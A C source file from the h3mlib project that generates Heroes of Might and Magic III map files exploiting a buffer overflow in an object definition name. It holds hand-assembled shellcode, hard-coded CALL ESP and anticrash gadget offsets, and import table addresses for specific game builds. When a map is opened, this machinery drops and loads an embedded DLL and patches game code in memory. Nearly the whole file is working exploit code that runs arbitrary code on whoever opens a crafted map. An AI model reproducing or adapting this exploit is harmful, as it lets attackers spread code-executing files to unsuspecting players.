// Created by John Åkerblom 2015-08-03

// Previously another technique where DLLs were stored in description instead
// of at eof was used, but the game starts crashing when description exceeds
// somewhere close to 0xFFFF bytes.

#include "../h3mlib.h"
#include "../internal/h3mlib_ctx.h"

#include "h3m_modembed.h"

#include <assert.h>
#include <stdio.h>

#define H3M_MODEMBED_TARGET_MAX 2

#pragma pack(push, 1)

// Offsets used to transfer control to shellcode.
// anticrash_gadget2 is accessed before anticrash_gadget1. Both are accesssed
// before the RETN which returns to call_esp_gadget, and are needed to not
// crash when using CALL ESP as the control transfer to shellcode.
struct offsets_t {
    // call_esp_gadget: Used to call ESP, starting shellcode execution
    uint32_t call_esp_gadget;
    // anticrash_gadget1: Has to pass through the following without taking the jump:
    // MOV EAX, DWORD PTR DS : [ECX]
    // CALL DWORD PTR DS : [EAX+4]
    // CMP EAX, 6
    // JAE SHORT 00503F88
    uint32_t anticrash_gadget1; 
    // anticrash_gadget1: Has to pass the following code down to final JMP. Other
    // variations also possible.
    // MOV EAX, DWORD PTR DS : [ESI + 4]; [anticrash_gadget1 + 4]
    // XOR EBX, EBX
    // CMP EAX, EBX
    // JE SHORT <crash spot>; JMP to crash if EAX is 0
    // MOV CL, BYTE PTR DS : [EAX - 1]
    // CMP CL, BL
    // JE SHORT <crash spot>; JMP to crash if the byte before [EAX] is 0
    // CMP CL, 0FF
    // JE SHORT <crash spot>; JMP to crash if the byte before [EAX] is 0xFF
    // CMP EDI, EBX
    // JNE <good spot>; JMP to good spot.
    uint32_t anticrash_gadget2;
};

static const struct offsets_t * const TARGET_OFFSETS[] = {
    // Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
    (struct offsets_t *)"\x87\xFF\x4E\x00\xD4\x97\x44\x00\x30\x64\x6A\x00",
    // Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
    // Extra unused offset for anticrash_gadget1 in mss32.dll 6.1d: 0x2112DBC6
    (struct offsets_t *)"\x0F\x0C\x58\x00\x48\x6A\x45\x00\x30\x68\x6A\x00", 
    // h3demo.exe 522B6F45F534058D02A561838559B1F4
    (struct offsets_t *)"\xB1\xEA\x43\x00\x0F\x0C\x58\x00\x00\xCE\x5C\x00"
};

// Extra offsets used in the shellcode
struct extra_offsets_t {
    uint32_t maps_stack_offset;
    uint32_t filename_stack_offset;
};

static const struct extra_offsets_t * const TARGET_EXTRA_OFFSETS[] = {
    // Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
    // maps_stack_offset 0x26C, filename_stack_offset 0x288 
    (struct extra_offsets_t *)"\x6C\x02\x00\x00\x88\x02\x00\x00",
    // Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
    // maps_stack_offset 0x26C, filename_stack_offset 0x288 
    (struct extra_offsets_t *)"\x8C\x02\x00\x00\xA8\x02\x00\x00"
    // h3demo.exe 522B6F45F534058D02A561838559B1F4
    // TODO retrieve
};


// Original return that gets overwritten, used to return without crash
static const uint32_t TARGET_RETNS[] = {
    // Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
    0x005045C1,
    // Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
    0x00504C11
    // h3demo.exe 522B6F45F534058D02A561838559B1F4
    // TODO retrieve
};

// Import Address Table values needed for loading DLL without crash
struct iat_t {
    // IAT values used to jmp to shellcode buf at eof
    uint32_t SetCurrentDirectoryA;
    uint32_t CreateFileA;
    uint32_t VirtualAlloc;
    uint32_t ReadFile;
    uint32_t WriteFile;

    // IAT values used in eof code for loading DLL. CloseHandle & LoadLibraryA
    // not really needed since GetProcAddress (primarily used for getting resolved
    // address of MessageBoxA to disable it) is had, but are still currently used.
    uint32_t GetModuleHandleA;
    uint32_t GetProcAddress;
    uint32_t CloseHandle;
    uint32_t LoadLibraryA;

    // Used for exiting cleanly after DLL load
    uint32_t ExitProcess;
};

static const struct iat_t * const TARGET_IATS[] = {
    // Heroes3.exe 78956DFAB3EB8DDF29F6A84CF7AD01EE
    // SetCurrentDirectoryA, CreateFileA, VirtualAlloc
    (struct iat_t *)"\x04\xA2\x63\x00\x04\xA1\x63\x00\x48\xA1\x63\x00"
    // ReadFile, WriteFile
    "\xF0\xA0\x63\x00\x14\xA1\x63\x00"
    // GetModuleHandleA, GetProcAddress
    "\x30\xA2\x63\x00\x2C\xA2\x63\x00"
    // CloseHandle, LoadLibraryA
    "\xC4\xA0\x63\x00\xFC\xA1\x63\x00"
    // ExitProcess
    "\xC0\xA1\x63\x00",
    // Heroes3 HD.exe 56614D31CC6F077C2D511E6AF5619280
    // SetCurrentDirectoryA, CreateFileA, VirtualAlloc
    (struct iat_t *)"\x04\xA2\x63\x00\x08\xA1\x63\x00\x48\xA1\x63\x00"
    // ReadFile, WriteFile
    "\xF4\xA0\x63\x00\x14\xA1\x63\x00"
    // GetModuleHandleA, GetProcAddress
    "\x30\xA2\x63\x00\x2C\xA2\x63\x00"
    // CloseHandle, LoadLibraryA
    "\xC8\xA0\x63\x00\xFC\xA1\x63\x00"
    // ExitProcess
    "\xC0\xA1\x63\x00"
    // h3demo.exe 522B6F45F534058D02A561838559B1F4
    // TODO retrieve
};

struct shellcode_oa_jmp_to_dll_load_t {
    uint8_t c1_1[11];
    uint32_t maps_stack_offset;
    uint8_t c1_2[3];
    uint32_t SetCurrentDirectoryA;
    uint8_t c1_3[18];
    uint32_t filename_stack_offset;
    uint8_t c1_4[3];
    uint32_t CreateFileA;
    uint8_t c1_5[10];
    uint32_t total_file_size;
    uint8_t c1_6[5];
    uint32_t VirtualAlloc;
    uint8_t c1_7[2];
    uint32_t shellcode_eof_offset;
    uint8_t c1_8[2];
    uint32_t ReadFile;
    uint8_t c2[35]; // includes c3, j2 up to ss
    uint32_t call_esp_gadget;
    uint32_t anticrash_gadget1;
    uint32_t anticrash_gadget2;
    uint8_t j1[2];
};

// This shellcode is put inside the OA section and jmps to DLL LOAD at EOF
static const uint8_t SHELLCODE_OA_JMP_TO_DLL_LOAD[] = {
        0xCC, 0xCC, 0xCC,                           // UNUSED
/*c1:*/ 0x8D, 0x64, 0xE4, 0x80,                     // LEA ESP, [ESP - 80]
        0x60,                                       // PUSHAD
        0x8B, 0x84, 0xE4, 0x12, 0x34, 0x56, 0x78,   // MOV EAX, DWORD PTR SS : [ESP + 0x12345678] ; str "", relative pos on stack
        0x50,                                       // PUSH EAX
        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.SetCurrentDirectoryA>]
        0x6A, 0x00,                                 // PUSH 0
        0x6A, 0x00,                                 // PUSH 0
        0x6A, 0x03,                                 // PUSH 3
        0x6A, 0x00,                                 // PUSH 0
        0x6A, 0x03,                                 // PUSH 3
        0x68, 0x00, 0x00, 0x00, 0x80,               // PUSH 80000000
        0x8B, 0x84, 0xE4, 0x12, 0x34, 0x56, 0x78,   // MOV EAX, DWORD PTR SS : [ESP + 0x12345678] ; str "<map name>", relative pos on stack
        0x50,                                       // PUSH EAX
        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
        0x89, 0xC3,                                 // MOV EBX, EAX
        0x6A, 0x40,                                 // PUSH 40
        0x68, 0x00, 0x10, 0x00, 0x00,               // PUSH 1000
        0xBF, 0x12, 0x34, 0x56, 0x78,               // MOV EDI, 0x12345678 ; total_file_size
        0x57,                                       // PUSH EDI
        0x6A, 0x00,                                 // PUSH 0
        0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,         // CALL DWORD PTR DS : [<&KeRNeL32.VirtualAlloc>] ; TODO free
        0x8D, 0xA8, 0x12, 0x34, 0x56, 0x78,         // LEA EBP, [EAX + 0x12345678] ; shellcode_eof_offset
        0x8B, 0x35, 0x12, 0x34, 0x56, 0x78,         // MOV ESI, DWORD PTR DS : [<&KeRNeL32.ReadFile>]
        0x6A, 0x00,                                 // PUSH 0
        0x54,                                       // PUSH ESP
        0x57,                                       // PUSH EDI
        0x50,                                       // PUSH EAX
        0xEB, 0x04,                                 // JS c2 <+0x04> ; jumps to c2
        0xCC, 0xCC, 0xCC, 0xCC,                     // ; GARBAGE, game trashes these bytes
/*c2:*/ 0x53,                                       // PUSH EBX
        0xEB, 0x07,                                 // JS c3 <+0x07> ; jumps to c3
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,   // ; GARBAGE, game trashes these bytes
/*c3:*/ 0xFF, 0xD6,                                 // CALL ESI ; Call [<&KeRNeL32.ReadFile>]
        0xFF, 0xE5,                                 // JMP EBP ; jump to desc shellcode
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,   // ; GARBAGE, game trashes these bytes
/*j2:*/ 0xEB, 0x8B,                                 // JS c1 <-0x72> ; j2, jumps to c1
        0xCC,                                       // UNUSED
/*ss:*/ 0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; CALL ESP-gadget
        0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; anticrash_gadget1
        0x12, 0x34, 0x56, 0x78,                     // db 0x12345678 ; anticrash_gadget2
/*j1:*/ 0xEB, 0xEF                                  // JS j2 <-0x0F> ; j1, jumps to j2
};

struct shellcode_eof_load_dll_t {
    uint8_t c1_1[3];
    uint32_t CloseHandle1;
    uint8_t c1_3[24];
    uint32_t CreateFileA;
    uint8_t c1_4[6];
    uint32_t dll_size;
    uint8_t c1_5[10];
    uint32_t WriteFile;
    uint8_t c1_6[3];
    uint32_t CloseHandle2;
    uint8_t c1_7[3];
    uint32_t LoadLibraryA;
    uint8_t c2_1[6];
    uint32_t GetModuleHandleA1;
    uint8_t c2_2[7];
    uint32_t GetProcAddress1;
    uint8_t c2_3[8];
    uint32_t GetModuleHandleA2;
    uint8_t c2_4[7];
    uint32_t GetProcAddress2;
    uint8_t c2_5[31];
    uint32_t orig_retn;
    uint8_t c2_6[4];
    uint32_t map_format;
    uint8_t c2_7[64]; // contains s: (strings) as well
    uint8_t dll[];
};

// This shellcode is at the EOF
static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
/*c1:*/ 0x53,                                       // PUSH EBX
    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.CloseHandle>]
    0x6A, 0x00,                                     // PUSH 0
    0x6A, 0x00,                                     // PUSH 0
    0x6A, 0x02,                                     // PUSH 2
    0x6A, 0x00,                                     // PUSH 0
    0x6A, 0x03,                                     // PUSH 3
    0x68, 0x00, 0x00, 0x00, 0x40,                   // PUSH 40000000
    0x8D, 0xB5, 0xA5, 0x00, 0x00, 0x00,             // LEA ESI, [EBP + 0AC] ; str "h3m_code.dll", from below
    0x56,                                           // PUSH ESI
    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
    0x89, 0xC3,                                     // MOV EBX, EAX
    0x6A, 0x00,                                     // PUSH 0
    0x54,                                           // PUSH ESP
    0x68, 0x12, 0x34, 0x56, 0x78,                   // PUSH 0x12345678 ; dll_size
    0x81, 0xC5, 0x12, 0x34, 0x56, 0x78,             // ADD EBP, 0x12345678 ; past this buffer and target fix buffer TODOTODOTDOTODTODODOTDO
    0x55,                                           // PUSH EBP
    0x53,                                           // PUSH EBX
    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.WriteFile>]
    0x53,                                           // PUSH EBX
    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.CloseHandle>]
    0x56,                                           // PUSH ESI
    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.LoadLibraryA>]
/*c2:*/ 0x83, 0xC6, 0x10,                           // ADD ESI, 10
    0x56,                                           // PUSH ESI
    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.GetModuleHandleA>]
    0x83, 0xC6, 0x07,                               // ADD ESI, 7
    0x56,                                           // PUSH ESI
    0x50,                                           // PUSH EAX
    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.GetProcAddress>]
    0x89, 0xC3,                                     // MOV EBX, EAX
    0x83, 0xC6, 0x0C,                               // ADD ESI, 0C
    0x56,                                           // PUSH ESI
    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.GetModuleHandleA>]
    0x83, 0xC6, 0x09,                               // ADD ESI, 9 ; str "VirtualProtect"
    0x56,                                           // PUSH ESI
    0x50,                                           // PUSH EAX
    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.GetProcAddress>]
    0x89, 0xC7,                                     // MOV EDI, EAX ; VirtualProtect()->EDI
    0x56,                                           // PUSH ESI ; str "VirtualProtect", now trashed to store dwOldProtect
    0x6A, 0x40,                                     // PUSH 40
    0x6A, 0x03,                                     // PUSH 3
    0x53,                                           // PUSH EBX
    0xFF, 0xD7,                                     // CALL EDI
    0xC7, 0x03, 0xC2, 0x10, 0x00, 0x00,             // MOV DWORD PTR DS : [EBX], 10C2 ; patch MessageBox function to RETN 4
    // Call target specific shellcode to prevent crashes
    0x89, 0xF0,                                     // MOV EAX, ESI
    0x83, 0xC0, 0x10,                               // ADD EAX, 10 ; point to target specific shellcode (past end of this buffer)
    0xFF, 0xD0,                                     // CALL EAX ; CALL target specific shellcode
    // Restore state
    0x61,                                           // POPAD
    0x81, 0xC4, 0x80, 0x00, 0x00, 0x00,             // ADD ESP, 80
    0x8D, 0xAC, 0xE4, 0x8C, 0x00, 0x00, 0x00,       // LEA EBP, [ESP + 8C]
    0xC7, 0x04, 0xE4, 0x12, 0x34, 0x56, 0x78,       // MOV DWORD PTR SS : [ESP], 0x12345678 ; original retn
    0xC7, 0x44, 0xE4, 0x04, 0x12, 0x34, 0x56, 0x78, // MOV DWORD PTR SS : [ESP + 4], 0x12345678 ; map format, previously overwritten
    0x31, 0xC0,                                     // XOR EAX, EAX
    0x40,                                           // INC EAX
    0xC3,                                           // RETN
    // Strings:
/*s*:*/ 0x00, 0x68, 0x33, 0x6D, 0x5F, 0x63, 0x6F, 0x64, 0x65, 0x2E, 0x64, 0x6C, 0x6C, 0x00,     // "h3m_code.dll"
    0x00, 0x00, 0x00,                                                                           // UNUSED
    0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x00,                                                   // "user32"
    0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00,                     // "MessageBoxA"
    0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x00,                                       // "kernel32"
    0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x00    // "VirtualProtect"

    // Here comes version specific shellcode that is called above
};

static const uint8_t TARGET_FIX_H3COMPLETE[] = {
    // Assumptions: 
    //      EAX: Address of this buffer
    //      EDI: Address of VirtualProtect()
    //      ESI: Valid adress for dwOldProtect
    // Add a NULL check to prevent crash for some code that seemingly cleans up old objects
    // when starting a new game (a NULL pointer was put in an array for the exploit OA)
    
    // Fix inline
    0xBB, 0x02, 0x48, 0x50, 0x00,                   // MOV EBX, 504802 ; crash spot in Heroes3.exe
    0x56,                                           // PUSH ESI
    0x6A, 0x40,                                     // PUSH 40
    0x6A, 0xFF,                                     // PUSH FF
    0x53,                                           // PUSH EBX
    0xFF, 0xD7,                                     // CALL EDI ; Call VirtualProtect()
    //// Code that is written inline at 00504802:
    //// 0x68, 0xD6, 0x2B, 0x01, 0x10,                    // PUSH 10012BD6 ; call code cave in smackw32.dll
    //// 0xC3,                                            // RETN
    //// 0x90,                                            // NOP ; preserve instruction boundary for debugging
    0xC7, 0x03, 0x68, 0xD6, 0x2B, 0x01,             // MOV DWORD PTR DS: [EBX], <code>
    0x83, 0xC3, 0x04,                               // ADD EBX, 4
    0xC7, 0x03, 0x10, 0xC3, 0x90, 0x8B,             // MOV DWORD PTR DS:  [EBX], <code>
    
    // Fix code cave
    0xBB, 0xD6, 0x2B, 0x01, 0x10,                   // MOV EBX, 10012BD6 ; code cave in smackw32.dll
    0x56,                                           // PUSH ESI
    0x6A, 0x40,                                     // PUSH 40
    0x6A, 0xFF,                                     // PUSH FF
    0x53,                                           // PUSH EBX
    0xFF, 0xD7,                                     // CALL EDI ; Call VirtualProtect()
    ////  Code that is written to code cave at 10012BD6:
    ////  0x85, 0xC0,                                     // TEST EAX, EAX ; NULL check EAX, skip crashing call if NULL
    ////  0x74, 0x07,                                     // JE SHORT 10012C1A
    ////  0x8B, 0xC8,                                     // MOV ECX, EAX                  ; original from  00504802
    ////  0x8B, 0x10,                                     // MOV EDX, DWORD PTR DS : [EAX] ; original from  00504802
    ////  0xFF, 0x52, 0x04,                               // CALL DWORD PTR DS : [EDX + 4] ; original from  00504802
    ////  0x68, 0x09, 0x48, 0x50, 0x00,                   // PUSH 504809 ; return to next instruction after inline hack
    ////  0xC3,                                           // RETN
    0xC7, 0x03, 0x85, 0xC0, 0x74, 0x07,             // MOV DWORD PTR DS: [EBX], <code>
    0x83, 0xC3, 0x04,                               // ADD EBX, 4
    0xC7, 0x03, 0x8B, 0xC8, 0x8B, 0x10,             // MOV DWORD PTR DS: [EBX], <code>
    0x83, 0xC3, 0x04,                               // ADD EBX, 4
    0xC7, 0x03, 0xFF, 0x52, 0x04, 0x68,             // MOV DWORD PTR DS: [EBX], <code>
    0x83, 0xC3, 0x04,                               // ADD EBX, 4
    0xC7, 0x03, 0x09, 0x48, 0x50, 0x00,             // MOV DWORD PTR DS: [EBX], <code>
    0x83, 0xC3, 0x04,                               // ADD EBX, 4
    0xC6, 0x03, 0xC3,                               // MOV BYTE PTR DS: [EBX], <code>
    
    // Done
    0xC3,                                           // RETN
};

static const uint8_t TARGET_FIX_HDMOD[] = {
    // Assumptions: 
    //      EAX: Address of this buffer
    //      EDI: Address of VirtualProtect()
    //      ESI: Valid adress for dwOldProtect
    // Patch away function 00504910 here to prevent HD Mod crash 
    0xBB, 0x10, 0x49, 0x50, 0x00,                   // MOV EBX, 504910
    0x56,                                           // PUSH ESI
    0x6A, 0x40,                                     // PUSH 40
    0x6A, 0x01,                                     // PUSH 1
    0x53,                                           // PUSH EBX
    0xFF, 0xD7,                                     // CALL EDI ; Call VirtualProtect()
    0xC6, 0x03, 0xC3,                               // MOV BYTE PTR DS : [EBX], 0C3 ; patch crashy function to RETN
    0xC3                                            // RETN
};

static const uint8_t * const TARGET_FIXES[] = {
    TARGET_FIX_H3COMPLETE,
    TARGET_FIX_HDMOD
};

// Data that makes the map editor satisfied by being a valid OA body, 
// while it also makes the game itself satisfied by being a valid start of
// OD section
static const uint8_t MAPED_VALIDATION[] = {
    0x12, 0x34, 0x56, 0x78, 0x04, 0x06, 0x00, 0x12, 0x34, 0x56, 0x78, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x68, 0x33, 0x6D, 0x6C, 0x69, 0x62, 0x20, 0x62,
    0x79, 0x20, 0x70, 0x6F, 0x74, 0x6D, 0x64, 0x65, 0x68, 0x65, 0x78, 0x00, 0x00, 0x00
};

#pragma pack(pop)

int h3m_modembed_write_oa_eof_jmp(struct H3M_MODEMBED *hm, uint32_t oa_count, uint32_t od_count, FILE * f)
{
    struct H3M_OA_ENTRY oa_entry = {{ 0 }}; // gcc cannot compile { 0 } in this context
    struct shellcode_oa_jmp_to_dll_load_t *shellcode_oa = NULL;
    const struct H3M_OA_BODY *sign_body = NULL;
    uint32_t def_size = 0;
    uint8_t initial_nul[7] = { 0 };
    const char SIGN_DEF[] = "avxsndg0.def";

    assert(sizeof(SHELLCODE_OA_JMP_TO_DLL_LOAD) == sizeof(*shellcode_oa));

    // IAT values not retrieved for demo target, so demo target is currently not supported here
    if (0 != hm->target && 1 != hm->target) {
        return 1;
    }

    const struct offsets_t *const ofs = TARGET_OFFSETS[hm->target];
    const struct iat_t *const iat = TARGET_IATS[hm->target];
    const struct extra_offsets_t *const sofs = TARGET_EXTRA_OFFSETS[hm->target];

    // Write an OA entry for sign object, to use it to make map valid in both map editor and game
    def_size = sizeof(SIGN_DEF)-1;
    fwrite(&def_size, 1, sizeof(uint32_t), f);
    fwrite(SIGN_DEF, 1, sizeof(SIGN_DEF)-1, f);
    sign_body = h3m_get_def_body(SIGN_DEF, NULL);
    fwrite(sign_body, 1, sizeof(*sign_body), f);

    // Write an OA entry whose def name causes a buffer overflow executing shellcode to jmp to eof shellcode

    // Initial 7 bytes: null term, then 2 unused, then 4 that gets trashed
    def_size = 7 + sizeof(SHELLCODE_OA_JMP_TO_DLL_LOAD);
    fwrite(&def_size, 1, sizeof(def_size), f);
    fwrite(initial_nul, 1, sizeof(initial_nul), f);

    // Save offset of this shellcode so it can be adjusted later
    hm->shellcode_oa_offset = ftell(f);

    // Construct & write shellcode in OA def name
    shellcode_oa = malloc(sizeof(*shellcode_oa));
    memcpy(shellcode_oa, SHELLCODE_OA_JMP_TO_DLL_LOAD,
        sizeof(SHELLCODE_OA_JMP_TO_DLL_LOAD));
    // IAT
    shellcode_oa->CreateFileA = iat->CreateFileA;
    shellcode_oa->ReadFile = iat->ReadFile;
    shellcode_oa->SetCurrentDirectoryA = iat->SetCurrentDirectoryA;
    shellcode_oa->VirtualAlloc = iat->VirtualAlloc;
    // Control transfer to shellcode
    shellcode_oa->call_esp_gadget = ofs->call_esp_gadget;
    shellcode_oa->anticrash_gadget1 = ofs->anticrash_gadget1;
    shellcode_oa->anticrash_gadget2 = ofs->anticrash_gadget2;
    // Stack offsets to strings on stack
    shellcode_oa->filename_stack_offset = sofs->filename_stack_offset;
    shellcode_oa->maps_stack_offset = sofs->maps_stack_offset;
    fwrite(shellcode_oa, 1, sizeof(*shellcode_oa), f);

    // For the OA body, put data that makes map editor satisfied by being a valid OA body, while it makes the game
    // satisfied by being a valid start of OD section
    memcpy(&oa_entry.body, MAPED_VALIDATION, sizeof(MAPED_VALIDATION));
    ((struct H3M_OD *)(&oa_entry.body))->count = od_count + 1;
    ((struct H3M_OD_ENTRY *)(((uint8_t *)& oa_entry.body) +
        4))->header.oa_index = oa_count;
    fwrite(&oa_entry.body, 1, sizeof(MAPED_VALIDATION), f);

    if (NULL != hm->shellcode_oa) {
        free(hm->shellcode_oa);
        hm->shellcode_oa = NULL;
    }
    hm->shellcode_oa = (uint8_t *)shellcode_oa;

    return 0;
}

int h3m_modembed_write_eof_dll(const struct H3M_MODEMBED *hm, uint32_t fm, FILE * f)
{
    struct H3M_OA_ENTRY oa_entry = {{ 0 }}; // gcc cannot compile { 0 } here
    struct shellcode_eof_load_dll_t *shellcode_eof = NULL;
    struct shellcode_oa_jmp_to_dll_load_t *shellcode_oa = NULL;
    long shellcode_eof_offset = 0;

    assert(sizeof(SHELLCODE_EOF_LOAD_DLL) == sizeof(*shellcode_eof));
    assert(sizeof(SHELLCODE_OA_JMP_TO_DLL_LOAD) == sizeof(*shellcode_oa));

    // Currently demo target not supported for DLL loading as IAT values not retrieved
    if (0 != hm->target && 1 != hm->target) {
        return 1;
    }

    const struct iat_t *const iat = TARGET_IATS[hm->target];
    const uint8_t *const shellcode_fix = TARGET_FIXES[hm->target];
    unsigned int shellcode_fix_size = sizeof(TARGET_FIXES[hm->target]);
    uint32_t orig_retn = TARGET_RETNS[hm->target];

    // Construct DLL loading shellcode
    shellcode_eof = malloc(sizeof(*shellcode_eof));
    memcpy(shellcode_eof, SHELLCODE_EOF_LOAD_DLL,
        sizeof(SHELLCODE_EOF_LOAD_DLL));
    shellcode_eof->CloseHandle1 = iat->CloseHandle;
    shellcode_eof->CloseHandle2 = iat->CloseHandle;
    shellcode_eof->CreateFileA = iat->CreateFileA;
    shellcode_eof->GetModuleHandleA1 = iat->GetModuleHandleA;
    shellcode_eof->GetModuleHandleA2 = iat->GetModuleHandleA;
    shellcode_eof->GetProcAddress1 = iat->GetProcAddress;
    shellcode_eof->GetProcAddress2 = iat->GetProcAddress;
    shellcode_eof->LoadLibraryA = iat->LoadLibraryA;
    shellcode_eof->WriteFile = iat->WriteFile;
    shellcode_eof->dll_size = hm->dll_size;
    shellcode_eof->orig_retn = orig_retn;
    shellcode_eof->map_format = fm;

    // Preserve file position, then write dll loading shellcoding as well as dll
    shellcode_eof_offset = ftell(f);
    fwrite(shellcode_eof, 1, sizeof(*shellcode_eof), f);
    fwrite(shellcode_fix, 1, shellcode_fix_size, f);
    fwrite(hm->dll, 1, hm->dll_size, f);

    // Go back in file and adjust the OA shellcode using the file positions we now know
    shellcode_oa = (struct shellcode_oa_jmp_to_dll_load_t *)hm->shellcode_oa;
    shellcode_oa->shellcode_eof_offset = shellcode_eof_offset;
    shellcode_oa->total_file_size = ftell(f);
    fseek(f, hm->shellcode_oa_offset, SEEK_SET);
    fwrite(shellcode_oa, 1, sizeof(*shellcode_oa), f);

    // Restore file pointer to end of file
    fseek(f, 0, SEEK_END);

    free(shellcode_eof);

    return 0;
}

int h3m_modembed_set_dll(h3mlib_ctx_t ctx, const char *dll)
{
    size_t n = 0;
    FILE *f = NULL;

    if (NULL == (f = fopen(dll, "rb"))) {
        return 1;
    }

    fseek(f, 0, SEEK_END);
    n = ftell(f);
    rewind(f);

    if (NULL != ctx->h3m_code.dll) {
        free(ctx->h3m_code.dll);
        ctx->h3m_code.dll = NULL;
    }

    ctx->h3m_code.dll = malloc(n);
    fread(ctx->h3m_code.dll, 1, n, f);
    ctx->h3m_code.dll_size = n;

    fclose(f);

    // Sign OA and exploit OA will be added
    ctx->h3m_code.extra_oa = 2;

    return 0;
}

int h3m_modembed_set_target(h3mlib_ctx_t ctx, enum H3M_MODEMBED_TARGET target)
{
    ctx->h3m_code.target = target;

    return 0;
}

int h3m_modembed_unset(h3mlib_ctx_t ctx)
{
    if (NULL != ctx->h3m_code.dll) {
        free(ctx->h3m_code.dll);
    }

    if (NULL != ctx->h3m_code.shellcode_oa) {
        free(ctx->h3m_code.shellcode_oa);
    }

    memset(&ctx->h3m_code, 0, sizeof(ctx->h3m_code));

    return 0;
}
